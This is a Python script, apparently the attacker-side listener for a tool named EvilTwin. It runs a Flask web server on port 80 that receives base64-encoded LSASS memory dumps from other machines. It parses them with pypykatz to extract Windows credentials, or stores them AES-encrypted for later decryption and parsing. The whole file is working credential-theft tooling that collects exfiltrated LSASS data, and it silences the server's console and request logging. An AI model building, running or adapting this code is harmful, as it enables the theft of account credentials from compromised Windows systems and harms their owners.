# a simple parser for the variants of data resulted from EvilTwin

from Crypto.Cipher import AES
import argparse
from flask import Flask
from flask import request
from flask import make_response
import logging
import click
import base64
from pypykatz.pypykatz import pypykatz


parser = argparse.ArgumentParser()
parser.add_argument('action', choices={'receive', 'decrypt', 'save'}, help='receive b64 lsass and parse it OR decrypt/decode and parse an AES encrypted dmp OR just save the AES encrypted dmp to disk')

parser.add_argument("-key", help="use only with (decrypt) argument")
parser.add_argument("-iv", help="use only with (decrypt) argument")
parser.add_argument("-file", help="use only with (decrypt) argument")

args = parser.parse_args()


def decrypt_and_parse():

	key = args.key
	IV = args.iv

	key = key.encode('utf-8')
	iv = IV.encode('utf-8')
	cipher = AES.new(key, AES.MODE_CBC, iv)

	print(f'[+] Decrypting and parsing minidump ...')
	with open(args.file, 'r') as f:
		data = f.read()
		encrypted_data = base64.b64decode(data)
		decrypted_data = cipher.decrypt(encrypted_data)
		print(pypykatz.parse_minidump_bytes(decrypted_data, packages=['all']))



def receive_and_parse():
	log = logging.getLogger('werkzeug')
	log.setLevel(logging.ERROR)



	def secho(text, file=None, nl=None, err=None, color=None, **styles):
	    pass

	def echo(text, file=None, nl=None, err=None, color=None, **styles):
	    pass

	click.echo = echo
	click.secho = secho


	app = Flask(__name__)
	app.config['ENV'] = 'production'

	@app.route('/', methods=["GET", "POST"])
	def index():

		data = request.get_data()
		data = data.decode('utf-8')

		raw_lsass = base64.b64decode(data)
		if raw_lsass:
			print("[*] received and decoded lsass, parsing..")

		print(pypykatz.parse_minidump_bytes(raw_lsass,packages=['all']))

		print("\nPRESS CTRL-C to exit")

		return make_response("Im A Teapot",200)
		

	if __name__ == '__main__':
		print("[+] started http server on: 0.0.0.0:80")
		print("[+] server response code: 200 Im A Teapot, (this is just for fun !)")
		app.run(debug=False, port=80, host="0.0.0.0")



def receive_and_save():
	log = logging.getLogger('werkzeug')
	log.setLevel(logging.ERROR)



	def secho(text, file=None, nl=None, err=None, color=None, **styles):
	    pass

	def echo(text, file=None, nl=None, err=None, color=None, **styles):
	    pass

	click.echo = echo
	click.secho = secho


	app = Flask(__name__)
	app.config['ENV'] = 'production'

	@app.route('/', methods=["GET", "POST"])
	def index():

		data = request.get_data()
		data = data.decode('utf-8')

		with open('lsass.aes', 'w') as file:
			file.write(data)
			print('[*] wrote encrypted lsass to (lsass.aes), PRESS CTRL-C to exit')

		return make_response("Im A Teapot",200)
		

	if __name__ == '__main__':
		print("[+] started http server on: 0.0.0.0:80")
		print("[+] server response code: 200 Im A Teapot, (this is just for fun !)")
		app.run(debug=False, port=80, host="0.0.0.0")



if args.action == "receive":
	receive_and_parse()

if args.action == "decrypt":
	decrypt_and_parse()

if args.action == "save":
	receive_and_save()